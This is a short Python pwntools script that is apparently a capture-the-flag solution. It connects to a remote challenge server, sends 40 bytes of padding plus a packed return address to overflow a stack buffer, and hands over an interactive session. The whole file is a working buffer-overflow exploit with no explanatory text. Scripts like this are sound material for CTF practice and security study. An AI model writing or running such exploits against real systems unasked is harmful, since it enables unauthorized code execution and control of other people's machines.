#!/usr/bin/env python3

from pwn import *

off = 40
addr = 0x400566
r = remote('csie.ctf.tw', 10120)
r.send('a'*off+p64(addr))
#print(r.recv())
r.interactive()
